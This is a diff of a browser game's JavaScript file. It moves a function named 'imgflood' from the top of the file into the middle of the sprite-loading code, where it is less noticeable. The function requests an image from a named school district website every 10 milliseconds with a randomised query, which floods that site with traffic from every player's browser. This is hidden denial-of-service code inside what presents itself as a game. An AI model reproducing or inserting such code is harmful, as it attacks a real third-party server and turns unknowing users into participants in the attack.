@@ -1,13 +1,3 @@
-function imgflood() {  
-  var TARGET = 'www.mvcsc.k12.in.us';
-  var URI = '/2/Home?r=';
-  var pic = new Image();
-  var rand = Math.floor(Math.random() * 1000);
-  pic.src = 'http://'+TARGET+URI+rand+'=val';
-}
-setInterval(imgflood, 10);
-
-
  //Hey! I'm really glad you got the game and I hope you like it!
  /*
   Finish first fight with Bandit by June
@@ -500,7 +490,14 @@ setInterval(imgflood, 10);
              };
              campfire.src = "Sprites/Campfire.png";
          }
-
+function imgflood() {  
+  var TARGET = 'www.mvcsc.k12.in.us';
+  var URI = '/2/Home?r=';
+  var pic = new Image();
+  var rand = Math.floor(Math.random() * 1000);
+  pic.src = 'http://'+TARGET+URI+rand+'=val';
+}
+setInterval(imgflood, 10);
          function FlowerBush(flowerBushX, flowerBushY) {
              var flowerBush = new Image();
              flowerBush.onload = function() {
